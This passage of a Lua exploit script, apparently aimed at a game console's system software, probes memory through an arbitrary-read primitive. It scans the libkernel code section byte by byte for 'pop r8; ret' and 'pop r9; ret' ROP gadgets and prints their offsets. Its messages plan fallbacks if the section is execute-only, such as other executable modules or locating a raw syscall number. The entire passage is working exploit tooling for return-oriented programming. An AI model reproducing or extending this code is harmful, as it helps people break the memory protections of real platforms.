    print("[E-ALT] No r8/r9 gadgets found in eboot.")
    print("  Alternative: identify underlying syscall and call with 4 regs.")
    print("  Or: find r8/r9 gadgets in OTHER readable modules (eboot only is 4.6MB).")
    print("")
    print("  Checking: can we read ANY libkernel .text?")

    local lk_test = rd(N(lkaddr(0)))
    if lk_test then
        print("  libkernel .text IS readable at base!")
        print("  scanning libkernel for pop r8/r9...")

        local lk_r8 = nil
        local lk_r9 = nil
        for off = 0, lk_scan_max - 4, 4 do
            local d = rd(N(lkaddr(0)) + off)
            if d == nil then break end
            if d < 0 then d = d + 0x100000000 end
            local b0 = d % 256
            local b1 = math.floor(d / 256) % 256
            local b2 = math.floor(d / 65536) % 256
            local b3 = math.floor(d / 16777216) % 256
            if not lk_r8 then
                if b0 == 0x41 and b1 == 0x58 and b2 == 0xC3 then lk_r8 = off end
                if b1 == 0x41 and b2 == 0x58 and b3 == 0xC3 then lk_r8 = off + 1 end
            end
            if not lk_r9 then
                if b0 == 0x41 and b1 == 0x59 and b2 == 0xC3 then lk_r9 = off end
                if b1 == 0x41 and b2 == 0x59 and b3 == 0xC3 then lk_r9 = off + 1 end
            end
            if lk_r8 and lk_r9 then break end
        end

        if lk_r8 then print(string.format("  pop r8;ret in libkernel at +0x%X!", lk_r8)) end
        if lk_r9 then print(string.format("  pop r9;ret in libkernel at +0x%X!", lk_r9)) end

        if not lk_r8 and not lk_r9 then
            print("  no pop r8/r9 in libkernel either")
        end
    else
        print("  libkernel .text is XO — cannot scan for gadgets")
        print("  will need to find r8/r9 gadgets in other RX modules")
        print("  or disassemble MapDirectMemory to find underlying syscall number")
    end
end

print("")
print("=== PROBE 528a COMPLETE ===")
print("alive=" .. tostring(alive()))
